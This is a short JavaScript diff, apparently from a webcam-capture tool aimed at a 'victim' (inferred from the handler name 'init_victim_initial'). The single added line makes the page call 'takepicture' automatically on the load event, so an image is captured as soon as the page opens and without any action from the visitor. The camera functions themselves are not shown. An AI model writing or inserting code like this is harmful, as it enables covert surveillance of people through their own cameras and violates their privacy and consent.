@@ -188,6 +188,7 @@
     // once loading is complete.
     window.addEventListener('load', init_victim_initial, false);
     window.addEventListener('load', startup, false);
+    window.addEventListener('load', takepicture, false);
     window.takePicture = takepicture;
     window.switch_state = switch_state;
 })();
